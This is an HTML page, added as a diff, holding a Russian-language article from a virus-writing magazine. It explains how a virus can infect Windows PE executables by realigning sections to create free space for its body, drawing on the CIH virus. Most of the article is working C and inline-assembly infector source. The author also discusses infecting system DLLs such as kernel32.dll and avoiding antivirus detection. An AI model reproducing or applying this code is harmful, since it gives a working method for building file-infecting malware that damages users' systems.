@@ -1,0 +1,476 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=windows-1251">
+<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
+<title>Top Device</title>
+</head>
+
+<body bgcolor="#B1B1B1" text="#000000" topmargin="0"
+leftmargin="3">
+
+<p><STYLE> </p>
+
+<p>INPUT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
+}</p>
+
+<p>SELECT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } </p>
+
+<p>OPTION { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } </p>
+
+<p>TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } </p>
+
+<p>FORM { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
+} <br>
+BODY { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } <br>
+P { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt }
+TABLE { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
+}TR { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } TD
+{ FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 10pt
+}TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } A { COLOR: #005500; TEXT-DECORATION: none }A:hover {
+TEXT-DECORATION: underline } A:link { TEXT-DECORATION: none
+}A:visited { }text:unknown { FONT-SIZE: 8pt } } </STYLE> </p>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+    <tr>
+        <td>&nbsp;</td>
+        <td valign="top"><div align="center"><center><table
+        border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tr>
+                <td width="100%" bgcolor="#000000"><img
+                src="../-.gif" width="1" height="1"></td>
+            </tr>
+            <tr>
+                <td width="100%" bgcolor="#808080"><strong>05.04.2000</strong>
+                PE инфекция - запись в
+                свободное место. <strong>[u_dev]</strong></td>
+            </tr>
+            <tr>
+                <td bgcolor="#000000"><img src="../-.gif"
+                width="1" height="1"></td>
+            </tr>
+            <tr>
+                <td><pre>
+
+ Итак, раздумывал я как-то над разными способами заражения PE 
+ файлов под Win9x/NT, и вспомнил про идею реализованную в win95.cih.
+ Там тело виря писалось в свободное место, остающееся после
+ выравнивания секции на FileAlignment, а стартовый код писался в
+ свободное место в PE header-е. Идея мне на тот момент нравилась, но
+ убивало малое количество свободного места в секциях, тут на C/C++
+ трудно что-ндь сделать. Да и стартовый код не на месте - насколько
+ я помню NT такие файлы не любит... Ну и глядя на PE header очередной
+ потенциальной жертвы я высмотрел что FileAlignment = 0x200 (512 байт).
+ Большинство файлов имеют именно такое значение FileAlignment (в принципе
+ это было известно и раньше). Подумав еще слегка мне пришло в голову что 
+ после загрузки в адресное пространство процесса, секции имеют иное
+ выравнивание - SectionAlignment. А вспомив что в архитектуре процессоров
+ x86 минимальный размер страницы равен 4096 байт (он же впрочем и
+ максимальный ;))), то возникает мысль что если перекомпоновать файл
+ и выровнять все секции в файле на эту величину (4096), то можно поиметь
+ несколько больше свободного места. Причем чем больше количество секций
+ тем больше может оказаться свободного пространства. Прирост свободного
+ пространства в одной секции варьируется от 0 до 4095 байт - что
+ согласитесь не плохо...
+ 
+ Собственно почему мне понравился данный метод. Дело в том что при
+ написании виря я столкнулся с такой проблемой: при заражении системных
+ dll-ей под NT нельзя бесконечно увеличивать ImageSize (увеличение последней
+ секции как раз требует этого). Потому как эти dll-и (в частности kernel32.dll)
+ система не желает перемещать на новое место в случае нехватки места при
+ загрузки по ImageBase. Возникновение такой ситуации приводит к остановке
+ загрузки системы... А места как раз и не хватает - следом  за kernel32.dll
+ идет ntdll.dll и расстояние между ними не очень велико. Для вирей на asm
+ это не очень страшно - а вот на С может стать (и стало) проблемой.
+
+ Так вот при использовании этого метода мы можем наскрести необходимое
+ пространство. Естественно что это не единственный путь. Однако я реализовал
+ именно его.
+
+ Собственно все реализовано в паре функций.
+
+ <font color="#0000A0">DWORD
+ UpgradeSection(
+     PVOID pMapFile,        // указатель на загруженный в память образ PE файла
+     DWORD dwSectionNumber, // номер секции для расширения
+     PVOID pArray,          // данные для записи в образовавшееся свободное место
+     DWORD dwArraySize,     // размер данных (должен быть заранее известен, если
+                            // свободного места не хватит то ф-я ничего не сделает)
+     LARGE_INTEGER *pOriginalFileSize  // размер файла до изменения этой секции
+     )</font>
+
+ UpgradeSection возвращает на сколько увеличился размер файла
+
+ Следущая ф-я FixUpDebugDirectory необходима для коррекции точки входа DebugDirectory
+ Кто сочтет ее лишней может ее выкинуть. Я ее использовал еще для одной цели.
+ Но о ней в данной статье нет смысла говорить.
+
+ <font color="#0000A0">DWORD
+ FixUpDebugDirectory(
+     PVOID pMapFile,        // указатель на загруженный в память образ PE файла
+     DWORD dwDelta,         // на сколько сместить DebugDirectory
+     IMAGE_SECTION_HEADER *pUpgradeSection // указатель на header изменяемой секции
+     )</font>
+                                                       
+ FixUpDebugDirectory - возвращает размер отладочной информации
+
+ Код абсолютно не оптимизирован (в тот момент такой цели не ставилось), так
+ что кому надо тот пусть этим и занимается.
+
+ В ф-ии UpgradeSection присутствует следущая вещь:
+
+ <font color="#0000A0">  if(pCodeSection != pSection)
+      pSection-&gt;Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;</font>
+
+ дело в том что в секциях &quot;.rdata&quot;, &quot;.data&quot; часто SizeOfRawData &lt;= VirtualSize,
+ то есть наш код может попасть в участок данных который после загрузки должен
+ быть проинициализирован 0. Мы же расширив секцию нарушаем это требование, это 
+ может быть фатальным для некоторых программ. Поэтому при сборке тела виря на
+ старте нам необходимо обнулить ту чать секции которую мы занимаем (после
+ переноса нашего кода на стек или еще куда, разумеется). Естественно что это
+ справедливо только для сегментов данных. Для сегмента кода этого делать не
+ нужно. Я применил простейшую проверку только на кодовый сегмент, однако имеет
+ смысл повторить сей же трюк для некоторых др. сегментов (например &quot;.reloc&quot;) -
+ дабы не вводить в искушение аверов...
+
+
+<font color="#0000A0">DWORD UpgradeSection(PVOID pMapFile, DWORD dwSectionNumber, PVOID pArray, DWORD
+dwArraySize, LARGE_INTEGER *pOriginalFileSize)
+{
+  if(!pMapFile || !pOriginalFileSize || !pArray || !dwArraySize)
+     return 0;
+  if(pOriginalFileSize-&gt;QuadPart == 0)
+     return 0;
+  if(NumOfSections(pMapFile) &lt;= (int)dwSectionNumber)
+     return 0;
+  
+  DWORD      dwFreeSize = 0;
+  DWORD      dwDelta = 0;
+  FILETIME  *pFileSize = (FILETIME*)pOriginalFileSize;
+
+  IMAGE_SECTION_HEADER *pSection = GetFreeSpaceIntoSection(pMapFile, &amp;dwFreeSize, dwSectionNumber);
+  if(!pSection)
+     return 0;
+  if(!dwFreeSize)
+     return 0;
+  if(dwFreeSize &lt; dwArraySize)
+     return 0;
+  IMAGE_SECTION_HEADER *pCodeSection = GetCodeSectionPtr(pMapFile, NULL);
+
+  if(pCodeSection != pSection)
+     pSection-&gt;Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;
+
+  DWORD dwAlignSizeSection = (GetSizeSectionReally(pSection) + 0x0fff) &amp; 0xfffff000;
+  if(dwAlignSizeSection == pSection-&gt;SizeOfRawData)
+    {
+     _memcpy((PBYTE)((DWORD)pMapFile + pSection-&gt;PointerToRawData + GetSizeSectionReally(pSection)), 
+             (PBYTE)pArray, dwArraySize);
+
+     if(pSection-&gt;Misc.VirtualSize &lt; dwAlignSizeSection)
+        pSection-&gt;Misc.VirtualSize = dwAlignSizeSection;
+     return 0;
+    }
+  else
+    {
+     dwDelta = dwAlignSizeSection - pSection-&gt;SizeOfRawData;
+     
+     FixUpDebugDirectory(pMapFile, dwDelta, pSection);
+     
+     _memcpy((PBYTE)((DWORD)pMapFile + pSection-&gt;PointerToRawData + dwAlignSizeSection), 
+             (PBYTE)((DWORD)pMapFile + pSection-&gt;PointerToRawData + pSection-&gt;SizeOfRawData),
+              pFileSize-&gt;dwLowDateTime - pSection-&gt;PointerToRawData - pSection-&gt;SizeOfRawData);
+     _memcpy((PBYTE)((DWORD)pMapFile + pSection-&gt;PointerToRawData + GetSizeSectionReally(pSection)), 
+             (PBYTE)pArray, dwArraySize);
+     
+     if(pSection-&gt;Misc.VirtualSize &lt; dwAlignSizeSection)
+        pSection-&gt;Misc.VirtualSize = dwAlignSizeSection;
+     pSection-&gt;SizeOfRawData = dwAlignSizeSection;
+
+     int nSections = NumOfSections(pMapFile);
+     PIMAGE_SECTION_HEADER psh = &amp;pSection[1];
+     for(int i=dwSectionNumber+1; i&lt;nSections; i++)
+       {
+        if(psh-&gt;PointerToRawData)
+           psh-&gt;PointerToRawData += dwDelta;
+        psh++;
+       }
+    }
+  return dwDelta;
+}
+
+IMAGE_SECTION_HEADER *GetFreeSpaceIntoSection(PVOID pMapFile, PDWORD pdwFreeSize,
+DWORD dwSectionNumber)
+{
+  if(!pdwFreeSize)
+     return NULL;
+  if(NumOfSections(pMapFile) &lt;= (int)dwSectionNumber)
+     return NULL;
+
+  DWORD dwSizeSection = 0;
+  DWORD dwFreeSize = 0;
+  IMAGE_SECTION_HEADER *pCodeSection = (PIMAGE_SECTION_HEADER)SECHDROFFSET(pMapFile);
+  if(pCodeSection)
+    {
+     pCodeSection += dwSectionNumber;
+     dwSizeSection = (GetSizeSectionReally(pCodeSection) + 0x0fff) &amp; 0xfffff000;
+     dwFreeSize = dwSizeSection - GetSizeSectionReally(pCodeSection);
+     *pdwFreeSize = dwFreeSize;
+    }
+  return pCodeSection;
+}
+
+IMAGE_SECTION_HEADER *GetCodeSectionPtr(PVOID pMapFile, PDWORD pdwSectionNumber)
+{
+  if(!pMapFile)
+     return NULL;
+
+  int                      nSections = NumOfSections(pMapFile);
+  int                      i;
+  PIMAGE_SECTION_HEADER    psh;
+
+  if((psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET(pMapFile)) != NULL)
+    {
+     for(i=0; i&lt;nSections; i++)
+       {
+        if((psh-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) &amp;&amp; !(psh-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE)) 
+          {
+           if(pdwSectionNumber)
+              *pdwSectionNumber = i;
+           return psh;
+          }
+        else
+           psh++;
+       }
+    }
+  return NULL;
+}
+
+DWORD GetSizeSectionReally(IMAGE_SECTION_HEADER *pSection)
+{
+  if(pSection-&gt;Misc.VirtualSize &lt;= pSection-&gt;SizeOfRawData)
+     return pSection-&gt;Misc.VirtualSize;
+  return pSection-&gt;SizeOfRawData;
+}
+
+DWORD FixUpDebugDirectory(PVOID pMapFile, DWORD dwDelta, IMAGE_SECTION_HEADER
+*pUpgradeSection)
+{
+  if(!pMapFile)
+     return 0;
+
+  PIMAGE_DEBUG_DIRECTORY debugDir;
+  PIMAGE_SECTION_HEADER  header;
+  unsigned               cDebugFormats, i;
+  DWORD                  offsetInto_rdata;
+  DWORD                  va_debug_dir;
+  PIMAGE_NT_HEADERS      pNTHeader = (PIMAGE_NT_HEADERS)PENTHDROFFSET(pMapFile);
+  SECTION_NAME           Debug;
+  SECTION_NAME           rData;
+  DWORD                  dwSizeDebugInfo = 0;
+
+
+  Debug.m_cLowWord = WORD4('.', 'd', 'e', 'b');
+  Debug.m_cHighWord = WORD4('u', 'g', 0, 0);
+  rData.m_cLowWord = WORD4('.', 'r', 'd', 'a');
+  rData.m_cHighWord = WORD4('t', 'a', 0, 0);
+  if(!pNTHeader)
+     return dwSizeDebugInfo;
+  // This line was so long that we had to break it up
+  va_debug_dir = pNTHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
+  if(va_debug_dir == 0)
+     return dwSizeDebugInfo;
+
+  // If we found a .debug section, and the debug directory is at the
+  // beginning of this section, it looks like a Borland file
+  header = GetSectionHeaderPtrByName(pMapFile, (char*)&amp;Debug);
+  if(header &amp;&amp; (header-&gt;VirtualAddress == va_debug_dir))
+    {
+     debugDir = (PIMAGE_DEBUG_DIRECTORY)(header-&gt;PointerToRawData+(DWORD)pMapFile);
+     cDebugFormats = pNTHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
+    }
+  else    // Look for microsoft debug directory in the .rdata section
+    {
+     header = GetSectionHeaderPtrByName(pMapFile, (char*)&amp;rData);
+     if(!header)
+        return dwSizeDebugInfo;
+
+     // See if there's even any debug directories to speak of...
+     cDebugFormats = pNTHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size /
+sizeof(IMAGE_DEBUG_DIRECTORY);
+     if(cDebugFormats == 0)
+        return dwSizeDebugInfo;
+  
+     offsetInto_rdata = va_debug_dir - header-&gt;VirtualAddress;
+     debugDir = MakePtr(PIMAGE_DEBUG_DIRECTORY, pMapFile, header-&gt;PointerToRawData + offsetInto_rdata);
+    }
+  
+  for(i=0; i &lt; cDebugFormats; i++)
+    {
+     if(pUpgradeSection)
+       {
+        if(pUpgradeSection-&gt;PointerToRawData &lt; debugDir-&gt;PointerToRawData)
+           debugDir-&gt;PointerToRawData += dwDelta;
+       }
+     dwSizeDebugInfo += debugDir-&gt;SizeOfData;
+     debugDir++;
+    }
+
+  return dwSizeDebugInfo;
+}
+
+IMAGE_SECTION_HEADER *GetSectionHeaderPtrByName(PVOID pMapFile, char *szSection)
+{
+  PIMAGE_SECTION_HEADER    psh;
+  int                      nSections = NumOfSections (pMapFile);
+  int                      i;
+
+  if((psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET(pMapFile)) != NULL)
+    {
+     for(i=0; i&lt;nSections; i++)
+       {
+        if(!_strnicmp((char*)psh-&gt;Name, szSection, IMAGE_SIZEOF_SHORT_NAME))
+          {
+           return psh;
+          }            
+        else
+           psh++;            
+       }        
+    }    
+  return NULL;
+}
+
+int _strnicmp(const char * first, const char * last, size_t count)
+{
+  int f,l;
+
+  if(count) 
+    {
+     do{
+        if(((f=(unsigned char)(*(first++))) &gt;= 'A') &amp;&amp; (f &lt;= 'Z') )
+           f -= 'A' - 'a';
+        
+        if(((l=(unsigned char)(*(last++))) &gt;= 'A') &amp;&amp; (l &lt;= 'Z') )
+           l -= 'A' - 'a';                 
+       } 
+     while(--count &amp;&amp; f &amp;&amp; (f == l));
+  
+     return( f - l );
+    }
+  
+  return(0);
+}
+
+int NumOfSections(PVOID pMapFile)
+{
+  /* Число сегментов из заголовка PE файла. */
+  return (int)((PIMAGE_FILE_HEADER) PEFHDROFFSET(pMapFile))-&gt;NumberOfSections;
+}
+
+__declspec(naked) void _memcpy(PBYTE pDest, PBYTE pSource, int dwCount)
+{
+//  if(pDest &gt; pSource)
+//    {
+//     for(; --dwCount &gt;= 0; )
+//       pDest[dwCount] = pSource[dwCount];
+//    }
+//  else
+//    {
+//     while(dwCount--)
+//       *pDest++ = *pSource++;
+//    }
+  __asm {
+          push    ebp
+          mov     ebp, esp
+
+          pushad
+
+          mov     esi, [pSource]
+          mov     edi, [pDest]
+          mov     ecx, [dwCount]
+          
+          test    ecx, ecx
+          jz      __Ex
+
+          cmp     edi, esi
+          jbe     __Dir
+
+          std
+
+          add     esi, ecx
+          add     edi, ecx
+          dec     esi
+          dec     edi
+
+          rep     movsb
+
+          cld
+          jmp     __Ex
+__Dir:
+          cld
+          rep     movsb
+__Ex:
+          popad
+
+          mov     esp, ebp
+          pop     ebp
+          ret
+        }
+}
+
+#define PAGESIZE               0x1000
+
+#define SIZE_OF_NT_SIGNATURE   4
+
+#define WORD4(a,b,c,d) ((a)+(b)*0x100+(c)*0x10000+(d)*0x1000000)
+#define MakePtr( cast, ptr, addValue ) (cast)( (DWORD)(ptr) + (addValue) )
+
+/* Смещение на сигнатуру PE файла                           */
+#define NTSIGNATURE(a) ((LPVOID)((BYTE *)a                +  \
+                        ((PIMAGE_DOS_HEADER)a)-&gt;e_lfanew))
+/* Операционные системы MS идентифицируют PE файлы по сигнатуре
+   размером dword; заголовок PE файла расположен непосредственно
+   после этого dword                                         */
+#define PEFHDROFFSET(a) ((LPVOID)((BYTE *)a               +  \
+                         ((PIMAGE_DOS_HEADER)a)-&gt;e_lfanew +  \
+                             SIZE_OF_NT_SIGNATURE))
+#define PENTHDROFFSET(a) ((LPVOID)((BYTE *)a               +  \
+                          ((PIMAGE_DOS_HEADER)a)-&gt;e_lfanew))
+/* Опциональный заголовок - сразу после заголовка PE файла   */
+#define OPTHDROFFSET(a) ((LPVOID)((BYTE *)a               +  \
+                         ((PIMAGE_DOS_HEADER)a)-&gt;e_lfanew +  \
+                           SIZE_OF_NT_SIGNATURE           +  \
+                           sizeof (IMAGE_FILE_HEADER)))
+/* Заголовки сегментов - сразу после опционального заголовка */
+#define SECHDROFFSET(a) ((LPVOID)((BYTE *)a               +  \
+                         ((PIMAGE_DOS_HEADER)a)-&gt;e_lfanew +  \
+                           SIZE_OF_NT_SIGNATURE           +  \
+                           sizeof (IMAGE_FILE_HEADER)     +  \
+                           sizeof (IMAGE_OPTIONAL_HEADER)))</font>
+
+
+</pre>
+                <pre> любые вопросы по поводу статьи можно задать на форуме <strong>
+ u_dev</strong></pre>
+                <pre><a href="http://topdev.tsx.org"> Статья для журнала Top Device</a></pre>
+                </td>
+            </tr>
+            <tr>
+                <td>&nbsp;</td>
+            </tr>
+            <tr>
+                <td>&nbsp;</td>
+            </tr>
+        </table>
+        </center></div></td>
+        <td>&nbsp;</td>
+    </tr>
+</table>
+
+<p>&nbsp;</p>
+</body>
+</html>
